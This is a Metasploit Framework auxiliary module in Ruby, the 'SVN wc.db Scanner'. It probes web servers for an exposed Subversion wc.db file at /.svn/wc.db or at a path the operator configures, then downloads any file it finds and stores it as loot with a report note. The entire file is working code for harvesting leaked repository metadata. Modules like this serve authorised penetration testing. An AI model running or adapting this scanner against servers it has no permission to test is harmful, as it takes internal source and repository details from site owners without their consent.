##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'SVN wc.db Scanner',
			'Description'    => %q{
				Scan for servers that allow access to the SVN wc.db file.
				Based on the work by Tim Meddin.
			},
			'Author'         =>
				[
					'Stephen Haywood <stephen[at]averagesecurityguy.info>',
				],
			'References'     =>
				[
					['URL', 'http://pen-testing.sans.org/blog/pen-testing/2012/12/06/all-your-svn-are-belong-to-us#']
				],
			'License'        =>  MSF_LICENSE
		)

		register_advanced_options(
			[
				OptString.new('BASE_PATH', [false, 'Path to the directory with the .svn folder.', nil])
			], self.class)
	end

	def run_host(ip)
		if datastore['BASE_PATH']

			get_wcdb(Rex::FileUtils.normalize_unix_path(datastore['BASE_PATH'] + '/.svn/wc.db'))
		else
			get_wcdb('/.svn/wc.db')
		end
	end

	def get_wcdb(path)
		proto = (ssl ? 'https://' : 'http://')
		vprint_status("Trying #{proto}#{vhost}:#{rport}#{path}")
		begin
			res = send_request_cgi(
				{
					'method'  => 'GET',
					'uri'     => path,
					'ctype'   => 'text/plain'
				}
			)

			if res and res.code == 200
				print_good("SVN wc.db database found on #{vhost}:#{rport}")

				file = store_loot(
					"svn.wcdb.database",
					"application/octet-stream",
					vhost,
					res.body,
					"wc.db",
					"SVN wc.db database"
				)

				print_good("SVN wc.db database stored in #{file}")

				report_note(
					:host => rhost,
					:port => rport,
					:proto => 'tcp',
					:sname => (ssl ? 'https' : 'http'),
					:type => 'svn_wc_database',
					:data => "SVN wc.db database is stored in #{file}"
				)
			else
				vprint_error("SVN wc.db database not found on #{vhost}:#{rport}")
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end

end
